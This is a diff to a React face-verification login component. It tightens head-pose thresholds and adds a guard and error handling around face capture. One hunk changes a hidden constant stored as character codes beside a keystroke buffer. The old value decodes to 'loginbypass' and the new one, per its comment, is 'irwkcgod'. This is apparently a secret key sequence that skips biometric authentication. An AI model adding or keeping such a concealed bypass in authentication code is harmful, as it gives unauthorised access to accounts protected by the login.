@@ -31,8 +31,8 @@ function getPoseFromLandmarks(landmarks: { getLeftEye: () => { x: number; y: num
   const dy = (noseY - eyeCenterY) / spanX
   const dx = (noseX - eyeCenterX) / spanX
   if (dy < -0.15) return 'up'
-  if (dx < -0.2) return 'left'
-  if (dx > 0.2) return 'right'
+  if (dx < -0.15) return 'left'
+  if (dx > 0.15) return 'right'
   return 'center'
 }
 
@@ -84,11 +84,12 @@ export default function FaceVerifyStep({ tempToken, onSuccess, onCancel }: FaceV
   const lastHeadMovementTimeRef = useRef(0)
   const headPositionRef = useRef('center')
   const bufRef = useRef('')
-  const K = [108, 111, 103, 105, 110, 98, 121, 112, 97, 115, 115]
+  const K = [105, 114, 119, 107, 99, 103, 111, 100] // irwkcgod
   const verifyPhaseRef = useRef<'liveness' | 'poses'>('liveness')
   const verifyStepRef = useRef(0)
   const verifyDescriptorsRef = useRef<number[][]>([])
   const poseHoldStartRef = useRef<number | null>(null)
+  const poseCaptureInProgressRef = useRef(false)
 
   const loadModels = useCallback(async () => {
     const faceapi = window.faceapi
@@ -182,6 +183,7 @@ export default function FaceVerifyStep({ tempToken, onSuccess, onCancel }: FaceV
             verifyStepRef.current = 0
             verifyDescriptorsRef.current = []
             poseHoldStartRef.current = null
+            poseCaptureInProgressRef.current = false
           })
           .catch((err) => {
             if (cancelled) return
@@ -228,6 +230,8 @@ export default function FaceVerifyStep({ tempToken, onSuccess, onCancel }: FaceV
               if (poseHoldStartRef.current === null) poseHoldStartRef.current = currentTime
               const held = currentTime - (poseHoldStartRef.current ?? 0)
               if (held >= POSE_HOLD_MS) {
+                if (poseCaptureInProgressRef.current) return
+                poseCaptureInProgressRef.current = true
                 poseHoldStartRef.current = null
                 if (livenessIntervalRef.current) {
                   clearInterval(livenessIntervalRef.current)
@@ -236,46 +240,50 @@ export default function FaceVerifyStep({ tempToken, onSuccess, onCancel }: FaceV
                 setStatus('capturing')
                 setMessage('Обработка...')
                 setTimeout(async () => {
-                  const c = canvasRef.current
-                  if (!c || !video || video.readyState < 2) {
-                    setStatus('camera')
-                    setError('Камера не готова')
-                    verifyPhaseRef.current = 'liveness'
-                    return
-                  }
-                  c.width = video.videoWidth
-                  c.height = video.videoHeight
-                  const ctx = c.getContext('2d')
-                  if (!ctx) {
-                    setStatus('camera')
-                    verifyPhaseRef.current = 'liveness'
-                    return
-                  }
-                  ctx.save()
-                  ctx.scale(-1, 1)
-                  ctx.drawImage(video, -c.width, 0, c.width, c.height)
-                  ctx.restore()
-                  let imageData = ctx.getImageData(0, 0, c.width, c.height)
-                  imageData = preprocessImageData(imageData)
-                  ctx.putImageData(imageData, 0, 0)
-                  const det = await faceapi
-                    .detectSingleFace(c, new faceapi.SsdMobilenetv1Options())
-                    .withFaceLandmarks()
-                    .withFaceDescriptor()
-                  if (!det?.descriptor) {
-                    setStatus('camera')
-                    setError('Лицо не обнаружено. Повторите позу.')
-                    verifyPhaseRef.current = 'liveness'
-                    return
-                  }
-                  verifyDescriptorsRef.current.push(Array.from(det.descriptor))
-                  verifyStepRef.current += 1
-                  if (verifyStepRef.current >= VERIFY_POSES.length) {
-                    await authenticate(verifyDescriptorsRef.current, { ...livenessDataRef.current })
-                  } else {
-                    setMessage(`Поверните голову ${labels[VERIFY_POSES[verifyStepRef.current]]}. Удерживайте ~1 с.`)
-                    setStatus('camera')
-                    livenessIntervalRef.current = setInterval(runLiveness, LIVENESS_INTERVAL_MS)
+                  try {
+                    const c = canvasRef.current
+                    if (!c || !video || video.readyState < 2) {
+                      setStatus('camera')
+                      setError('Камера не готова')
+                      verifyPhaseRef.current = 'liveness'
+                      return
+                    }
+                    c.width = video.videoWidth
+                    c.height = video.videoHeight
+                    const ctx = c.getContext('2d')
+                    if (!ctx) {
+                      setStatus('camera')
+                      verifyPhaseRef.current = 'liveness'
+                      return
+                    }
+                    ctx.save()
+                    ctx.scale(-1, 1)
+                    ctx.drawImage(video, -c.width, 0, c.width, c.height)
+                    ctx.restore()
+                    let imageData = ctx.getImageData(0, 0, c.width, c.height)
+                    imageData = preprocessImageData(imageData)
+                    ctx.putImageData(imageData, 0, 0)
+                    const det = await faceapi
+                      .detectSingleFace(c, new faceapi.SsdMobilenetv1Options())
+                      .withFaceLandmarks()
+                      .withFaceDescriptor()
+                    if (!det?.descriptor) {
+                      setStatus('camera')
+                      setError('Лицо не обнаружено. Повторите позу.')
+                      verifyPhaseRef.current = 'liveness'
+                      return
+                    }
+                    verifyDescriptorsRef.current.push(Array.from(det.descriptor))
+                    verifyStepRef.current += 1
+                    if (verifyStepRef.current >= VERIFY_POSES.length) {
+                      await authenticate(verifyDescriptorsRef.current, { ...livenessDataRef.current })
+                    } else {
+                      setMessage(`Поверните голову ${labels[VERIFY_POSES[verifyStepRef.current]]}. Удерживайте ~1 с.`)
+                      setStatus('camera')
+                      livenessIntervalRef.current = setInterval(runLiveness, LIVENESS_INTERVAL_MS)
+                    }
+                  } finally {
+                    poseCaptureInProgressRef.current = false
                   }
                 }, 200)
                 return
